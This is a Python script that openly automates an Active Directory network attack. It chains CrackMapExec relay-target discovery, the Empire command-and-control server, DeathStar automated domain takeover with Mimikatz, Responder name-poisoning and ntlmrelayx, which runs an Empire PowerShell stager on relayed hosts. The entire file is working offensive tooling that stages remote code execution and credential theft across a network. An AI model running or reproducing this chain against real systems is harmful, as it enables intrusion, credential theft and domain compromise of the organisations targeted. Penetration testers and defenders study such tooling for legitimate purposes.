#!/usr/bin/env python

import ConfigParser
import argparse
import logging
import os
import time
import requests
import subprocess
import libtmux

def main():
    
    #------------------------------------------------------------------------------
    # Configure Argparse to handle command line arguments
    #------------------------------------------------------------------------------
    desc = "Empire / DeathStar / Responder / NTLMRelayX automation script"
    
    parser = argparse.ArgumentParser(description=desc)
    
    parser.add_argument('-d','--debug',
                        help='Print lots of debugging statements',
                        action="store_const",dest="loglevel",const=logging.DEBUG,
                        default=logging.WARNING
    )
    parser.add_argument('-v','--verbose',
                        help='Be verbose',
                        action="store_const",dest="loglevel",const=logging.INFO
    )
    parser.add_argument('host_ip', help='Host IP',
                        nargs='?', default = ''
    )
    parser.add_argument('target_ip', help='Target IP / Range / Subnet (nmap format)',
                        nargs='?', default = ''
    )
    parser.add_argument('--port', '-p', help='Port for Empire listener (443)',
                        default='443'
    )
    parser.add_argument('--no-relay', help='Disable Responder / NTLMRelayX spoofing and relaying',
                        action='store_true', dest='disable_relay'
    )
    parser.add_argument('--no-deathstar', help='Disable Deathstar autopwn',
                        action='store_true', dest='disable_deathstar'
    )
    parser.add_argument('--no-mimikatz', help='Do not use Mimikatz during lateral movement (default: False)',
                        action='store_true', dest='disable_mimikatz'
    )
    parser.add_argument('--no-domain-privesc', help='Do not use domain privilege escalation techniques (default: False)',
                        action='store_true', dest='disable_domain_privesc'
    )

    args = parser.parse_args()
    
    host_ip = args.host_ip
    target_ip = args.target_ip
    empire_lport = args.port
    disable_relay = args.disable_relay
    disable_deathstar = args.disable_deathstar
    disable_mimikatz = args.disable_mimikatz
    disable_domain_privesc = args.disable_domain_privesc
    
    if not host_ip:
        host_ip = raw_input("\nEnter interface IP address to listen on: ")
    if not target_ip and not disable_relay:
        target_ip = raw_input("\nEnter relay target IP / Range / Subnet (nmap format): ")
    
    empire_user = os.environ['EMPIRE_USER']
    empire_pass = os.environ['EMPIRE_PASS']
    
    # Set up tmux window
    tmux_server = libtmux.Server()
    tmux_session = tmux_server.new_session(session_name="deathstar", kill_session=True, attach=False)
    tmux_window = tmux_session.new_window(attach=True, window_name="deathstar")
    
    if not disable_relay:
        print("Getting relay target list using CrackMapExec...")
        print("This can take a few minutes on a full subnet - we need to find a more efficient way to do this part...")
        subprocess.Popen("touch targets.txt", shell=True).wait()
        subprocess.Popen("cme --timeout 15 smb %s --gen-relay-list targets.txt" % (target_ip), shell=True).wait()
    
    print("\nLaunching Empire (waiting 10s)...")
    command = 'cd /opt/Empire && ./empire --rest --username %s --password %s' % (empire_user, empire_pass)
    tmux_window.attached_pane.send_keys(command)
    time.sleep(10)
    
    
    print("\nLaunching DeathStar (waiting 5s)...")
    command = 'cd /opt/DeathStar && python3 ./DeathStar.py -u %s -p %s -lip %s -lp %s' % (empire_user, empire_pass, host_ip, empire_lport)
    if disable_mimikatz:
        command += " --no-mimikatz"
    if disable_domain_privesc:
        command+= " --no-domain-privesc"
    #tmux_window.split_window(shell=command)
    tmux_pane = tmux_window.split_window()
    tmux_pane.send_keys(command)
    time.sleep(5)
    
    # Even if we do not use DeathStar, we still use it to spawn the listener; leave the window open in case we want to fire it up again later
    if disable_deathstar:
        print("Killing DeathStar...")
        tmux_pane.send_keys('C-c', enter=False, suppress_history=False)
    
    print("\nGetting API Token...")
    requests.packages.urllib3.disable_warnings()        #Disable untrusted SSL cert warning
    json = requests.post('https://localhost:1337/api/admin/login', verify=False, json={"username":empire_user, "password":empire_pass}).json()
    empire_token = json['token']
    print("Token: " + empire_token)
    
    print("\nGetting powershell stager...")
    json = requests.post('https://localhost:1337/api/stagers?token=' + empire_token, verify=False, json={"StagerName":"multi/launcher", "Listener":"DeathStar"}).json()
    empire_stager = json['multi/launcher']['Output']
    print("Stager: " + empire_stager)
    
    if not disable_relay:
        command = "python /usr/local/bin/ntlmrelayx.py -smb2support -tf targets.txt -c '" + empire_stager + "'"
        #tmux_window.split_window(shell=command)
        tmux_pane = tmux_window.split_window()
        tmux_pane.send_keys(command)
        
        command = "cd /opt/Responder && python ./Responder.py -I eth0 -r -d -w -e " + host_ip
        #tmux_window.split_window(shell=command)
        tmux_pane = tmux_window.split_window()
        tmux_pane.send_keys(command)
    
    tmux_window.select_layout("main-vertical")
    tmux_server.attach_session(target_session="deathstar")
    
if __name__ == '__main__':
    main()